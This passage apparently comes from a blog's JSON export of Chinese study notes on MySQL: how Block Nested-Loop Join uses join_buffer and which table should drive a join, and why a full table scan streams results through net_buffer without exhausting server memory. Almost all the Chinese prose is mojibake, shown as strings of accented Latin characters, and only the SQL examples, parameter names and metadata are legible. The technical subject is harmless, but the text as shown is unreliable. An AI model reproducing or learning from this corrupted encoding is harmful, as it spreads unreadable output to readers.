å‡è®¾å°è¡¨çš„è¡Œæ•°æ˜¯ Nï¼Œå¤§è¡¨çš„è¡Œæ•°æ˜¯ Mï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªç®—æ³•é‡Œï¼š ä¸¤ä¸ªè¡¨éƒ½åšä¸€æ¬¡å…¨è¡¨æ‰«æï¼Œæ‰€ä»¥æ€»çš„æ‰«æè¡Œæ•°æ˜¯ M+Nï¼› å†…å­˜ä¸­çš„åˆ¤æ–­æ¬¡æ•°æ˜¯ M*Nã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè°ƒæ¢è¿™ä¸¤ä¸ªç®—å¼ä¸­çš„ M å’Œ N æ²¡å·®åˆ«ï¼Œå› æ­¤è¿™æ—¶å€™é€‰æ‹©å¤§è¡¨è¿˜æ˜¯å°è¡¨åšé©±åŠ¨è¡¨ï¼Œæ‰§è¡Œè€—æ—¶æ˜¯ä¸€æ ·çš„ã€‚ ç„¶åï¼Œä½ å¯èƒ½é©¬ä¸Šå°±ä¼šé—®äº†ï¼Œè¿™ä¸ªä¾‹å­é‡Œè¡¨ t1 æ‰ 100 è¡Œï¼Œè¦æ˜¯è¡¨ t1 æ˜¯ä¸€ä¸ªå¤§è¡¨ï¼Œjoin_buffer æ”¾ä¸ä¸‹æ€ä¹ˆåŠå‘¢ï¼Ÿ join_buffer çš„å¤§å°æ˜¯ç”±å‚æ•° join_buffer_size è®¾å®šçš„ï¼Œé»˜è®¤å€¼æ˜¯ 256kã€‚å¦‚æœæ”¾ä¸ä¸‹è¡¨ t1 çš„æ‰€æœ‰æ•°æ®è¯ï¼Œç­–ç•¥å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ†æ®µæ”¾ã€‚æˆ‘æŠŠ join_buffer_size æ”¹æˆ 1200ï¼Œå†æ‰§è¡Œä¸Šé¢çš„è¯­å¥ï¼Œæ‰§è¡Œè¿‡ç¨‹å°±å˜æˆäº†ï¼š æ‰«æè¡¨ t1ï¼Œé¡ºåºè¯»å–æ•°æ®è¡Œæ”¾å…¥ join_buffer ä¸­ï¼Œæ”¾å®Œç¬¬ 88 è¡Œ join_buffer æ»¡äº†ï¼Œç»§ç»­ç¬¬ 2 æ­¥ æ‰«æè¡¨ t2ï¼ŒæŠŠ t2 ä¸­çš„æ¯ä¸€è¡Œå–å‡ºæ¥ï¼Œè·Ÿ join_buffer ä¸­çš„æ•°æ®åšå¯¹æ¯”ï¼Œæ»¡è¶³ join æ¡ä»¶çš„ï¼Œä½œä¸ºç»“æœé›†çš„ä¸€éƒ¨åˆ†è¿”å› æ¸…ç©º join_buffer ç»§ç»­æ‰«æè¡¨ t1ï¼Œé¡ºåºè¯»å–æœ€åçš„ 12 è¡Œæ•°æ®æ”¾å…¥ join_buffer ä¸­ï¼Œç»§ç»­æ‰§è¡Œç¬¬ 2 æ­¥ æ‰§è¡Œæµç¨‹å›¾ä¹Ÿå˜æˆäº†ï¼š å›¾ä¸­çš„æ­¥éª¤ 4 å’Œ 5ï¼Œè¡¨ç¤ºæ¸…ç©º join_buffer å†å¤ç”¨ã€‚ è¿™ä¸ªæµç¨‹æ‰ä½“ç°å‡ºäº†è¿™ä¸ªç®—æ³•åå­—ä¸­â€œBlockâ€çš„ç”±æ¥ï¼Œè¡¨ç¤ºâ€œåˆ†å—å» joinâ€ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ—¶å€™ç”±äºè¡¨ t1 è¢«åˆ†æˆäº†ä¸¤æ¬¡æ”¾å…¥ join_buffer ä¸­ï¼Œå¯¼è‡´è¡¨ t2 ä¼šè¢«æ‰«æä¸¤æ¬¡ã€‚è™½ç„¶åˆ†æˆä¸¤æ¬¡æ”¾å…¥ join_bufferï¼Œä½†æ˜¯åˆ¤æ–­ç­‰å€¼æ¡ä»¶çš„æ¬¡æ•°è¿˜æ˜¯ä¸å˜çš„ï¼Œä¾ç„¶æ˜¯ (88+12)*1000=10 ä¸‡æ¬¡ã€‚ æˆ‘ä»¬å†æ¥çœ‹ä¸‹ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹é©±åŠ¨è¡¨çš„é€‰æ‹©é—®é¢˜ã€‚ å‡è®¾ï¼Œé©±åŠ¨è¡¨çš„æ•°æ®è¡Œæ•°æ˜¯ Nï¼Œéœ€è¦åˆ† K æ®µæ‰èƒ½å®Œæˆç®—æ³•æµç¨‹ï¼Œè¢«é©±åŠ¨è¡¨çš„æ•°æ®è¡Œæ•°æ˜¯ Mã€‚ æ³¨æ„ï¼Œè¿™é‡Œçš„ K ä¸æ˜¯å¸¸æ•°ï¼ŒN è¶Šå¤§ K å°±ä¼šè¶Šå¤§ï¼Œå› æ­¤æŠŠ K è¡¨ç¤ºä¸ºÎ»*Nï¼Œæ˜¾ç„¶Î»çš„å–å€¼èŒƒå›´æ˜¯ (0,1)ã€‚ æ‰€ä»¥ï¼Œåœ¨è¿™ä¸ªç®—æ³•çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼š æ‰«æè¡Œæ•°æ˜¯ N+Î»NMï¼›å†…å­˜åˆ¤æ–­ N*M æ¬¡ã€‚æ˜¾ç„¶ï¼Œå†…å­˜åˆ¤æ–­æ¬¡æ•°æ˜¯ä¸å—é€‰æ‹©å“ªä¸ªè¡¨ä½œä¸ºé©±åŠ¨è¡¨å½±å“çš„ã€‚è€Œè€ƒè™‘åˆ°æ‰«æè¡Œæ•°ï¼Œåœ¨ M å’Œ N å¤§å°ç¡®å®šçš„æƒ…å†µä¸‹ï¼ŒN å°ä¸€äº›ï¼Œæ•´ä¸ªç®—å¼çš„ç»“æœä¼šæ›´å°ã€‚ æ‰€ä»¥ç»“è®ºæ˜¯ï¼Œåº”è¯¥è®©å°è¡¨å½“é©±åŠ¨è¡¨ã€‚ å½“ç„¶ï¼Œä½ ä¼šå‘ç°ï¼Œåœ¨ N+Î»NM è¿™ä¸ªå¼å­é‡Œï¼ŒÎ»æ‰æ˜¯å½±å“æ‰«æè¡Œæ•°çš„å…³é”®å› ç´ ï¼Œè¿™ä¸ªå€¼è¶Šå°è¶Šå¥½ã€‚ åˆšåˆšæˆ‘ä»¬è¯´äº† N è¶Šå¤§ï¼Œåˆ†æ®µæ•° K è¶Šå¤§ã€‚é‚£ä¹ˆï¼ŒN å›ºå®šçš„æ—¶å€™ï¼Œä»€ä¹ˆå‚æ•°ä¼šå½±å“ K çš„å¤§å°å‘¢ï¼Ÿï¼ˆä¹Ÿå°±æ˜¯Î»çš„å¤§å°ï¼‰ç­”æ¡ˆæ˜¯ join_buffer_sizeã€‚join_buffer_size è¶Šå¤§ï¼Œä¸€æ¬¡å¯ä»¥æ”¾å…¥çš„è¡Œè¶Šå¤šï¼Œåˆ†æˆçš„æ®µæ•°ä¹Ÿå°±è¶Šå°‘ï¼Œå¯¹è¢«é©±åŠ¨è¡¨çš„å…¨è¡¨æ‰«ææ¬¡æ•°å°±è¶Šå°‘ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ°ä¸€äº›å»ºè®®å‘Šè¯‰ä½ ï¼Œå¦‚æœä½ çš„ join è¯­å¥å¾ˆæ…¢ï¼Œå°±æŠŠ join_buffer_size æ”¹å¤§ã€‚ ç†è§£äº† Mysql çš„ä¸¤ç§ join ç®—æ³•ï¼Œç°åœ¨å†æ¥è¯•ç€å›ç­”æ–‡ç« å¼€å¤´çš„ä¸¤ä¸ªé—®é¢˜ã€‚ ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šèƒ½ä¸èƒ½ä½¿ç”¨ join è¯­å¥ï¼Ÿ å¦‚æœå¯ä»¥ä½¿ç”¨ Index Nested-Loop Join ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç”¨ä¸Šè¢«é©±åŠ¨è¡¨ä¸Šçš„ç´¢å¼•ï¼Œå…¶å®æ˜¯æ²¡é—®é¢˜çš„ å¦‚æœä½¿ç”¨ Block Nested-Loop Join ç®—æ³•ï¼Œæ‰«æè¡Œæ•°å°±ä¼šè¿‡å¤šã€‚å°¤å…¶æ˜¯åœ¨å¤§è¡¨ä¸Šçš„ join æ“ä½œï¼Œè¿™æ ·å¯èƒ½è¦æ‰«æè¢«é©±åŠ¨è¡¨å¾ˆå¤šæ¬¡ï¼Œä¼šå ç”¨å¤§é‡çš„ç³»ç»Ÿèµ„æºã€‚æ‰€ä»¥è¿™ç§ join å°½é‡ä¸è¦ç”¨ å¦‚ä½•åˆ¤æ–­è¦ä¸è¦ä½¿ç”¨ join è¯­å¥æ—¶ï¼Œå°±æ˜¯çœ‹ explain ç»“æœé‡Œé¢ï¼ŒExtra å­—æ®µé‡Œé¢æœ‰æ²¡æœ‰å‡ºç°â€œBlock Nested Loopâ€å­—æ ·ã€‚ ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼šå¦‚æœè¦ä½¿ç”¨ joinï¼Œåº”è¯¥é€‰æ‹©å¤§è¡¨åšé©±åŠ¨è¡¨è¿˜æ˜¯é€‰æ‹©å°è¡¨åšé©±åŠ¨è¡¨ï¼Ÿ å¦‚æœæ˜¯ Index Nested-Loop Join ç®—æ³•ï¼Œåº”è¯¥é€‰æ‹©å°è¡¨åšé©±åŠ¨è¡¨ï¼› å¦‚æœæ˜¯ Block Nested-Loop Join ç®—æ³•ï¼š åœ¨ join_buffer_size è¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œæ˜¯ä¸€æ ·çš„ï¼› åœ¨ join_buffer_size ä¸å¤Ÿå¤§çš„æ—¶å€™ï¼ˆè¿™ç§æƒ…å†µæ›´å¸¸è§ï¼‰ï¼Œåº”è¯¥é€‰æ‹©å°è¡¨åšé©±åŠ¨è¡¨ã€‚ æ‰€ä»¥ï¼Œè¿™ä¸ªé—®é¢˜çš„ç»“è®ºå°±æ˜¯ï¼Œæ€»æ˜¯åº”è¯¥ä½¿ç”¨å°è¡¨åšé©±åŠ¨è¡¨ã€‚ å½“ç„¶äº†ï¼Œè¿™é‡Œæˆ‘éœ€è¦è¯´æ˜ä¸‹ï¼Œä»€ä¹ˆå«ä½œâ€œå°è¡¨â€ï¼Œå¹¶ä¸æ˜¯è¯´å“ªå¼ è¡¨çš„æ•°æ®é‡å°ï¼Œå“ªä¸ªå°±æ˜¯å°è¡¨ã€‚ æˆ‘ä»¬å‰é¢çš„ä¾‹å­æ˜¯æ²¡æœ‰åŠ æ¡ä»¶çš„ã€‚å¦‚æœæˆ‘åœ¨è¯­å¥çš„ where æ¡ä»¶åŠ ä¸Š t2.id&lt;=50 è¿™ä¸ªé™å®šæ¡ä»¶ï¼Œå†æ¥çœ‹ä¸‹è¿™ä¸¤æ¡è¯­å¥ï¼š 12select * from t1 straight_join t2 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;50;select * from t2 straight_join t1 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;50; æ³¨æ„ï¼Œä¸ºäº†è®©ä¸¤æ¡è¯­å¥çš„è¢«é©±åŠ¨è¡¨éƒ½ç”¨ä¸ä¸Šç´¢å¼•ï¼Œæ‰€ä»¥ join å­—æ®µéƒ½ä½¿ç”¨äº†æ²¡æœ‰ç´¢å¼•çš„å­—æ®µ bã€‚ ä½†å¦‚æœæ˜¯ç”¨ç¬¬äºŒä¸ªè¯­å¥çš„è¯ï¼Œjoin_buffer åªéœ€è¦æ”¾å…¥ t2 çš„å‰ 50 è¡Œï¼ˆt1 è¡¨éœ€è¦æŠŠæ¯ä¸€è¡Œå–å‡ºæ¥ï¼Œè·Ÿ join_buffer ä¸­çš„æ•°æ®åšå¯¹æ¯”ï¼‰ï¼Œæ˜¾ç„¶æ˜¯æ›´å¥½çš„ã€‚æ‰€ä»¥è¿™é‡Œï¼Œâ€œt2 çš„å‰ 50 è¡Œâ€æ˜¯é‚£ä¸ªç›¸å¯¹å°çš„è¡¨ï¼Œä¹Ÿå°±æ˜¯â€œå°è¡¨â€ã€‚ æˆ‘ä»¬å†æ¥çœ‹å¦å¤–ä¸€ç»„ä¾‹å­ï¼š 12select t1.b,t2.* from t1 straight_join t2 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;100;select t1.b,t2.* from t2 straight_join t1 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;100; è¿™ä¸ªä¾‹å­é‡Œï¼Œè¡¨ t1 å’Œ t2 éƒ½æ˜¯åªæœ‰ 100 è¡Œå‚åŠ  joinã€‚ä½†æ˜¯ï¼Œè¿™ä¸¤æ¡è¯­å¥æ¯æ¬¡æŸ¥è¯¢æ”¾å…¥ join_buffer ä¸­çš„æ•°æ®æ˜¯ä¸ä¸€æ ·çš„ï¼š è¡¨ t1 åªæŸ¥å­—æ®µ bï¼Œå› æ­¤å¦‚æœæŠŠ t1 æ”¾åˆ° join_buffer ä¸­ï¼Œåˆ™ join_buffer ä¸­åªéœ€è¦æ”¾å…¥ b çš„å€¼ï¼›è¡¨ t2 éœ€è¦æŸ¥æ‰€æœ‰çš„å­—æ®µï¼Œå› æ­¤å¦‚æœæŠŠè¡¨ t2 æ”¾åˆ° join_buffer ä¸­çš„è¯ï¼Œå°±éœ€è¦æ”¾å…¥ä¸‰ä¸ªå­—æ®µ idã€a å’Œ bã€‚è¿™é‡Œï¼Œæˆ‘ä»¬åº”è¯¥é€‰æ‹©è¡¨ t1 ä½œä¸ºé©±åŠ¨è¡¨ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œâ€œåªéœ€è¦ä¸€åˆ—å‚ä¸ join çš„è¡¨ t1â€æ˜¯é‚£ä¸ªç›¸å¯¹å°çš„è¡¨ã€‚ æ‰€ä»¥ï¼Œæ›´å‡†ç¡®åœ°è¯´ï¼Œåœ¨å†³å®šå“ªä¸ªè¡¨åšé©±åŠ¨è¡¨çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯ä¸¤ä¸ªè¡¨æŒ‰ç…§å„è‡ªçš„æ¡ä»¶è¿‡æ»¤ï¼Œè¿‡æ»¤å®Œæˆä¹‹åï¼Œè®¡ç®—å‚ä¸ join çš„å„ä¸ªå­—æ®µçš„æ€»æ•°æ®é‡ï¼Œæ•°æ®é‡å°çš„é‚£ä¸ªè¡¨ï¼Œå°±æ˜¯â€œå°è¡¨â€ï¼Œåº”è¯¥ä½œä¸ºé©±åŠ¨è¡¨ã€‚ æ€»ç»“ å¦‚æœå¯ä»¥ä½¿ç”¨è¢«é©±åŠ¨è¡¨çš„ç´¢å¼•ï¼Œjoin è¯­å¥è¿˜æ˜¯æœ‰å…¶ä¼˜åŠ¿çš„ ä¸èƒ½ä½¿ç”¨è¢«é©±åŠ¨è¡¨çš„ç´¢å¼•ï¼Œåªèƒ½ä½¿ç”¨ Block Nested-Loop Join ç®—æ³•ï¼Œè¿™æ ·çš„è¯­å¥å°±å°½é‡ä¸è¦ä½¿ç”¨ åœ¨ä½¿ç”¨ join çš„æ—¶å€™ï¼Œåº”è¯¥è®©å°è¡¨åšé©±åŠ¨è¡¨","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"33 æˆ‘æŸ¥è¿™ä¹ˆå¤šæ•°æ®ï¼Œä¼šä¸ä¼šæŠŠæ•°æ®åº“å†…å­˜æ‰“çˆ†","slug":"if-I-check-so-much-data-will-it-blow-up-the-database-memory","date":"2022-08-25T03:00:58.000Z","updated":"2023-02-18T03:28:33.602Z","comments":true,"path":"if-I-check-so-much-data-will-it-blow-up-the-database-memory/","link":"","permalink":"https://www.0x2beace.com/if-I-check-so-much-data-will-it-blow-up-the-database-memory/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å…¨éƒ¨æ‰«æå¯¹ Server å±‚çš„å½±å“","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å…¨éƒ¨æ‰«æå¯¹ Server å±‚çš„å½±å“ å…¨è¡¨æ‰«æå¯¹ server å±‚çš„å½±å“å‡è®¾ï¼Œç°åœ¨éœ€è¦å¯¹ä¸€ä¸ª 200G çš„ InnoDB è¡¨ db1. tï¼Œæ‰§è¡Œä¸€ä¸ªå…¨è¡¨æ‰«æã€‚å½“ç„¶ï¼Œä½ è¦æŠŠæ‰«æç»“æœä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¼šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å‘½ä»¤ï¼š 1mysql -h$host -P$port -u$user -p$pwd -e &quot;select * from db1.t&quot; &gt; target_file.sql InnoDB çš„æ•°æ®æ˜¯ä¿å­˜åœ¨ä¸»é”®ç´¢å¼•ä¸Šçš„ï¼Œæ‰€ä»¥å…¨è¡¨æ‰«æå®é™…ä¸Šæ˜¯ç›´æ¥æ‰«æè¡¨ t çš„ä¸»é”®ç´¢å¼•ã€‚è¿™æ¡æŸ¥è¯¢è¯­å¥ç”±äºæ²¡æœ‰å…¶ä»–çš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‰€ä»¥æŸ¥åˆ°çš„æ¯ä¸€è¡Œéƒ½å¯ä»¥ç›´æ¥æ”¾åˆ°ç»“æœé›†é‡Œé¢ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ é‚£ä¹ˆï¼Œè¿™ä¸ªâ€œç»“æœé›†â€å­˜åœ¨å“ªé‡Œå‘¢ï¼Ÿ å®é™…ä¸Šï¼ŒæœåŠ¡ç«¯å¹¶ä¸éœ€è¦ä¿å­˜ä¸€ä¸ªå®Œæ•´çš„ç»“æœé›†ã€‚å–æ•°æ®å’Œå‘æ•°æ®çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼š è·å–ä¸€è¡Œï¼Œå†™åˆ° net_buffer ä¸­ã€‚è¿™å—å†…å­˜çš„å¤§å°æ˜¯ç”±å‚æ•° net_buffer_length å®šä¹‰çš„ï¼Œé»˜è®¤æ˜¯ 16kã€‚ é‡å¤è·å–è¡Œï¼Œç›´åˆ° net_buffer å†™æ»¡ï¼Œè°ƒç”¨ç½‘ç»œæ¥å£å‘å‡ºå»ã€‚ å¦‚æœå‘é€æˆåŠŸï¼Œå°±æ¸…ç©º net_bufferï¼Œç„¶åç»§ç»­å–ä¸‹ä¸€è¡Œï¼Œå¹¶å†™å…¥ net_bufferã€‚ å¦‚æœå‘é€å‡½æ•°è¿”å› EAGAIN æˆ– WSAEWOULDBLOCKï¼Œå°±è¡¨ç¤ºæœ¬åœ°ç½‘ç»œæ ˆï¼ˆsocket send bufferï¼‰å†™æ»¡äº†ï¼Œè¿›å…¥ç­‰å¾…ã€‚ç›´åˆ°ç½‘ç»œæ ˆé‡æ–°å¯å†™ï¼Œå†ç»§ç»­å‘é€ã€‚ è¿™ä¸ªè¿‡ç¨‹å¯¹åº”çš„æµç¨‹å›¾å¦‚ä¸‹æ‰€ç¤ºã€‚ ä»è¿™ä¸ªæµç¨‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼š ä¸€ä¸ªæŸ¥è¯¢åœ¨å‘é€è¿‡ç¨‹ä¸­ï¼Œå ç”¨çš„ MySQL å†…éƒ¨çš„å†…å­˜æœ€å¤§å°±æ˜¯ net_buffer_length è¿™ä¹ˆå¤§ï¼Œå¹¶ä¸ä¼šè¾¾åˆ° 200G socket send buffer ä¹Ÿä¸å¯èƒ½è¾¾åˆ° 200Gï¼ˆé»˜è®¤å®šä¹‰ /proc/sys/net/core/wmem_defaultï¼‰ï¼Œå¦‚æœ socket send buffer è¢«å†™æ»¡ï¼Œå°±ä¼šæš‚åœè¯»æ•°æ®çš„æµç¨‹ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒMySQL æ˜¯â€œè¾¹è¯»è¾¹å‘çš„â€ï¼Œè¿™ä¸ªæ¦‚å¿µå¾ˆé‡è¦ã€‚è¿™å°±æ„å‘³ç€ï¼Œå¦‚æœå®¢æˆ·ç«¯æ¥æ”¶å¾—æ…¢ï¼Œä¼šå¯¼è‡´ MySQL æœåŠ¡ç«¯ç”±äºç»“æœå‘ä¸å‡ºå»ï¼Œè¿™ä¸ªäº‹åŠ¡çš„æ‰§è¡Œæ—¶é—´å˜é•¿ã€‚ æ¯”å¦‚ä¸‹é¢è¿™ä¸ªçŠ¶æ€ï¼Œå°±æ˜¯æˆ‘æ•…æ„è®©å®¢æˆ·ç«¯ä¸å»è¯» socket receive buffer ä¸­çš„å†…å®¹ï¼Œç„¶ååœ¨æœåŠ¡ç«¯ show processlist çœ‹åˆ°çš„ç»“æœã€‚ å¦‚æœä½ çœ‹åˆ° State çš„å€¼ä¸€ç›´å¤„äºâ€œSending to clientâ€ï¼Œå°±è¡¨ç¤ºæœåŠ¡å™¨ç«¯çš„ç½‘ç»œæ ˆå†™æ»¡äº†ã€‚ åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æ›¾æåˆ°ï¼Œå¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨â€“quick å‚æ•°ï¼Œä¼šä½¿ç”¨ mysql_use_result æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯è¯»ä¸€è¡Œå¤„ç†ä¸€è¡Œã€‚ä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå‡è®¾æœ‰ä¸€ä¸ªä¸šåŠ¡çš„é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œæ¯è¯»ä¸€è¡Œæ•°æ®ä»¥åè¦å¤„ç†çš„é€»è¾‘å¦‚æœå¾ˆæ…¢ï¼Œå°±ä¼šå¯¼è‡´å®¢æˆ·ç«¯è¦è¿‡å¾ˆä¹…æ‰ä¼šå»å–ä¸‹ä¸€è¡Œæ•°æ®ï¼Œå¯èƒ½å°±ä¼šå‡ºç°ä¸Šå›¾æ‰€ç¤ºçš„è¿™ç§æƒ…å†µã€‚ å› æ­¤ï¼Œå¯¹äºæ­£å¸¸çš„çº¿ä¸Šä¸šåŠ¡æ¥è¯´ï¼Œå¦‚æœä¸€ä¸ªæŸ¥è¯¢çš„è¿”å›ç»“æœä¸ä¼šå¾ˆå¤šçš„è¯ï¼Œæˆ‘éƒ½å»ºè®®ä½ ä½¿ç”¨ mysql_store_result è¿™ä¸ªæ¥å£ï¼Œç›´æ¥æŠŠæŸ¥è¯¢ç»“æœä¿å­˜åˆ°æœ¬åœ°å†…å­˜ï¼ˆMysql é»˜è®¤æ­£æ˜¯ mysql_store_result è¿™ä¸ªæ¥å£ï¼‰ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ åœ¨è‡ªå·±è´Ÿè´£ç»´æŠ¤çš„ MySQL é‡Œçœ‹åˆ°å¾ˆå¤šä¸ªçº¿ç¨‹éƒ½å¤„äºâ€œSending to clientâ€è¿™ä¸ªçŠ¶æ€ï¼Œå°±æ„å‘³ç€ä½ è¦è®©ä¸šåŠ¡å¼€å‘åŒå­¦ä¼˜åŒ–æŸ¥è¯¢ç»“æœï¼Œå¹¶è¯„ä¼°è¿™ä¹ˆå¤šçš„è¿”å›ç»“æœæ˜¯å¦åˆç†ã€‚ è€Œå¦‚æœè¦å¿«é€Ÿå‡å°‘å¤„äºè¿™ä¸ªçŠ¶æ€çš„çº¿ç¨‹çš„è¯ï¼Œå°† net_buffer_length å‚æ•°è®¾ç½®ä¸ºä¸€ä¸ªæ›´å¤§çš„å€¼æ˜¯ä¸€ä¸ªå¯é€‰æ–¹æ¡ˆã€‚ ä¸â€œSending to clientâ€é•¿ç›¸å¾ˆç±»ä¼¼çš„ä¸€ä¸ªçŠ¶æ€æ˜¯â€œSending dataâ€ï¼Œè¿™æ˜¯ä¸€ä¸ªç»å¸¸è¢«è¯¯ä¼šçš„é—®é¢˜ã€‚æœ‰åŒå­¦é—®æˆ‘è¯´ï¼Œåœ¨è‡ªå·±ç»´æŠ¤çš„å®ä¾‹ä¸Šçœ‹åˆ°å¾ˆå¤šæŸ¥è¯¢è¯­å¥çš„çŠ¶æ€æ˜¯â€œSending dataâ€ï¼Œä½†æŸ¥çœ‹ç½‘ç»œä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜å•Šï¼Œä¸ºä»€ä¹ˆ Sending data è¦è¿™ä¹ˆä¹…ï¼Ÿ å®é™…ä¸Šï¼Œä¸€ä¸ªæŸ¥è¯¢è¯­å¥çš„çŠ¶æ€å˜åŒ–æ˜¯è¿™æ ·çš„ï¼ˆæ³¨æ„ï¼šçœç•¥äº†å…¶ä»–æ— å…³çš„çŠ¶æ€ï¼‰ï¼š MySQL æŸ¥è¯¢è¯­å¥è¿›å…¥æ‰§è¡Œé˜¶æ®µåï¼Œé¦–å…ˆæŠŠçŠ¶æ€è®¾ç½®æˆâ€œSending dataâ€ï¼› ç„¶åï¼Œå‘é€æ‰§è¡Œç»“æœçš„åˆ—ç›¸å…³çš„ä¿¡æ¯ï¼ˆmeta data) ç»™å®¢æˆ·ç«¯ï¼› å†ç»§ç»­æ‰§è¡Œè¯­å¥çš„æµç¨‹ï¼› æ‰§è¡Œå®Œæˆåï¼ŒæŠŠçŠ¶æ€è®¾ç½®æˆç©ºå­—ç¬¦ä¸²ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€œSending dataâ€å¹¶ä¸ä¸€å®šæ˜¯æŒ‡â€œæ­£åœ¨å‘é€æ•°æ®â€ï¼Œè€Œå¯èƒ½æ˜¯å¤„äºæ‰§è¡Œå™¨è¿‡ç¨‹ä¸­çš„ä»»æ„é˜¶æ®µã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥æ„é€ ä¸€ä¸ªé”ç­‰å¾…çš„åœºæ™¯ï¼Œå°±èƒ½çœ‹åˆ° Sending data çŠ¶æ€ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œsession B æ˜æ˜¾æ˜¯åœ¨ç­‰é”ï¼ŒçŠ¶æ€å´æ˜¾ç¤ºä¸º Sending dataã€‚ MySQL é‡‡ç”¨çš„æ˜¯è¾¹ç®—è¾¹å‘çš„é€»è¾‘ï¼Œå› æ­¤å¯¹äºæ•°æ®é‡å¾ˆå¤§çš„æŸ¥è¯¢ç»“æœæ¥è¯´ï¼Œä¸ä¼šåœ¨ server ç«¯ä¿å­˜å®Œæ•´çš„ç»“æœé›†ã€‚æ‰€ä»¥ï¼Œå¦‚æœå®¢æˆ·ç«¯è¯»ç»“æœä¸åŠæ—¶ï¼Œä¼šå µä½ MySQL çš„æŸ¥è¯¢è¿‡ç¨‹ï¼Œä½†æ˜¯ä¸ä¼šæŠŠå†…å­˜æ‰“çˆ†ã€‚ å…¨è¡¨æ‰«æè¿˜æ˜¯æ¯”è¾ƒè€—è´¹ IO èµ„æºçš„ï¼Œæ‰€ä»¥ä¸šåŠ¡é«˜å³°æœŸè¿˜æ˜¯ä¸èƒ½ç›´æ¥åœ¨çº¿ä¸Šä¸»åº“æ‰§è¡Œå…¨è¡¨æ‰«æçš„ã€‚ æ€»ç»“ æŸ¥è¯¢çš„ç»“æœæ˜¯åˆ†æ®µå‘ç»™å®¢æˆ·ç«¯çš„ï¼Œå› æ­¤æ‰«æå…¨è¡¨ï¼ŒæŸ¥è¯¢è¿”å›å¤§é‡çš„æ•°æ®ï¼Œå¹¶ä¸ä¼šæŠŠå†…å­˜æ‰“çˆ†ã€‚ æŸ¥è¯¢è¿”å›çš„ç»“æœä¸å¤šçš„è¯ï¼Œå»ºè®®ä½¿ç”¨ mysql_store_result è¿™ä¸ªæ¥å£ï¼ˆé»˜è®¤ï¼‰ï¼Œå¦‚æœæŸ¥è¯¢è¿”å›çš„ç»“æœé›†å¾ˆå¤šï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±éœ€è¦æ”¹ç”¨ mysql_use_result æ¥å£äº†ã€‚ å°† net_buffer_length çš„å€¼è®¾ç½®æ›´å¤§ï¼Œå¯ä»¥è§£å†³å¤šä¸ªçº¿ç¨‹éƒ½å¤„äºâ€œSending to clientâ€ çš„çŠ¶æ€ã€‚ ä»…å½“ä¸€ä¸ªçº¿ç¨‹å¤„äºâ€œç­‰å¾…å®¢æˆ·ç«¯æ¥æ”¶ç»“æœâ€çš„çŠ¶æ€ï¼Œæ‰ä¼šæ˜¾ç¤ºâ€Sending to clientâ€ï¼›è€Œå¦‚æœæ˜¾ç¤ºæˆâ€œSending 